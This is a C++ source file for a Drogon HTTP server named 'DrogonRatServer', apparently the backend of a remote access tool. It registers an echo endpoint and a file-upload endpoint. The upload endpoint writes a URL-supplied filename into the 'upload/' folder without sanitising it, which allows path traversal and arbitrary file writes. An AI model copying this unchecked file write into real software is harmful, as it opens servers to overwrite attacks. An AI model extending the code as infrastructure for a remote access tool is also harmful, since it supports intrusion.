#include "DrogonRatServer/Handler.hpp"
#include "DrogonRatServer/debug.hpp"

#include <drogon/HttpAppFramework.h>
#include <drogon/HttpRequest.h>
#include <drogon/HttpResponse.h>
#include <drogon/orm/Mapper.h>
#include <fmt/core.h>
#include <fstream>
#include <functional>

using namespace drogon;

namespace DrogonRatServer {
using HttpResponseCallback =
    std::function<void(const drogon::HttpResponsePtr &)>;

void Handler::registerAll() {
    this->registerEchoHandler();
    this->registerTelegramBotApiHandler();
    this->registerUploadHandler();
}

void Handler::registerUploadHandler() {
    this->drogon_app.registerHandler(
        "/upload={filename}", // filename provided in URL
        [](const drogon::HttpRequestPtr &req, HttpResponseCallback &&callback,
           const std::string &filename) {
            std::ofstream out(fmt::format("upload/{}", filename),
                              std::ios::binary);
            out << req->getBody();
            out.close();

            auto resp = drogon::HttpResponse::newHttpResponse();
            resp->setBody(fmt::format("Saved as upload/{}", filename));
            callback(resp);
        },
        {drogon::Post, drogon::Put});
}

void Handler::registerEchoHandler() {
    this->drogon_app.registerHandler(
        "/echo={message}", // message provided in URL
        [](const drogon::HttpRequestPtr &, HttpResponseCallback &&arg_Callback,
           const std::string &arg_Message) {
            INFO_LOG("Receiving as message:\n{}", arg_Message);
            auto resp = drogon::HttpResponse::newHttpResponse();
            resp->setBody(arg_Message);
            arg_Callback(resp);
        },
        {drogon::Get, drogon::Post});
}

} // namespace DrogonRatServer
